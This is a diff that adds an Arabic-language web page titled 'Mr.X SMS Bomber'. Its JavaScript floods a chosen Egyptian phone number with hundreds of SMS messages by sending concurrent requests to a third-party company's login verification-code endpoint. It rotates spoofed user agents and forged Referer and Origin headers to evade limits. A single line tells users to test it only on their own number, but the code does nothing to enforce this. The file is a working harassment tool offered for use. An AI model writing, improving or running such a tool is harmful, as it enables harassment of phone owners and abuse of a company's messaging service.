@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Mr.X SMS Bomber</title>
+  <style>
+    * { font-family: 'Tajawal', sans-serif; }
+    body { background: linear-gradient(135deg, #1a1a2e, #16213e); color: #fff; text-align: center; padding: 20px; }
+    .container { max-width: 500px; margin: auto; background: rgba(0,0,0,0.5); padding: 30px; border-radius: 20px; box-shadow: 0 0 20px #00ff88; }
+    h1 { color: #00ff88; text-shadow: 0 0 10px #00ff88; }
+    input, button, textarea { width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 10px; font-size: 16px; }
+    input, textarea { background: #333; color: #0f0; }
+    button { background: #00ff88; color: #000; font-weight: bold; cursor: pointer; transition: 0.3s; }
+    button:hover { background: #00cc66; transform: scale(1.05); }
+    #status { margin-top: 20px; font-weight: bold; color: #0f0; }
+    .progress { height: 10px; background: #333; border-radius: 5px; margin: 10px 0; overflow: hidden; }
+    .bar { height: 100%; width: 0%; background: #00ff88; transition: width 0.3s; }
+  </style>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="container">
+    <h1>Mr.X SMS Bomber</h1>
+    <p>للتجربة على رقمك أنت فقط</p>
+
+    <input type="text" id="phone" placeholder="رقمك (01012345678)" />
+    <textarea id="message" placeholder="الرسالة المخصصة (مثال: مرحبا، ده اختبار)"></textarea>
+    <input type="number" id="count" placeholder="عدد الرسائل (مثال: 500)" value="500" />
+    <input type="number" id="threads" placeholder="السرعة (10-30)" value="20" min="10" max="30" />
+
+    <button onclick="start()">ابدأ الإرسال</button>
+
+    <div id="status">جاهز للإرسال...</div>
+    <div class="progress"><div class="bar" id="bar"></div></div>
+  </div>
+
+  <script>
+    const url = "https://api.twistmena.com/music/Dlogin/sendCode";
+    const userAgents = [
+      "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/124.0 Mobile Safari/537.36",
+      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
+    ];
+
+    function randVal() {
+      return Array(8).fill().map(() => "0123456789abcdef"[Math.floor(Math.random()*16)]).join('');
+    }
+
+    function getHeaders() {
+      return {
+        "User-Agent": userAgents[Math.floor(Math.random()*userAgents.length)],
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Referer": "https://twistmena.com/",
+        "Origin": "https://twistmena.com",
+      };
+    }
+
+    async function sendSMS(phone, msg) {
+      const payload = JSON.stringify({
+        dial: "2" + phone,
+        randomValue: randVal(),
+        customText: msg
+      });
+      try {
+        const res = await fetch(url, {
+          method: "POST",
+          headers: getHeaders(),
+          body: payload
+        });
+        return res.status === 200;
+      } catch {
+        return false;
+      }
+    }
+
+    async function start() {
+      const phone = document.getElementById("phone").value.trim();
+      const msg = document.getElementById("message").value.trim();
+      const count = parseInt(document.getElementById("count").value);
+      const threads = parseInt(document.getElementById("threads").value);
+
+      if (!phone || !msg || count < 1) {
+        alert("املأ كل الحقول!");
+        return;
+      }
+      if (!/^01\d{9}$/.test(phone)) {
+        alert("الرقم لازم 11 رقم ويبدأ بـ 01");
+        return;
+      }
+
+      document.querySelector("button").disabled = true;
+      document.getElementById("status").innerText = "جاري الإرسال...";
+
+      let success = 0;
+      const promises = [];
+
+      for (let i = 0; i < count; i++) {
+        promises.push(sendSMS(phone, msg));
+        if (promises.length >= threads || i === count - 1) {
+          const results = await Promise.all(promises);
+          success += results.filter(r => r).length;
+          promises.length = 0;
+
+          const progress = ((i + 1) / count) * 100;
+          document.getElementById("bar").style.width = progress + "%";
+          document.getElementById("status").innerText = `تم: ${success} | جاري: ${i + 1}/${count}`;
+        }
+      }
+
+      document.getElementById("status").innerText = `انتهى! تم: ${success} من ${count}`;
+      document.querySelector("button").disabled = false;
+    }
+  </script>
+</body>
+</html>
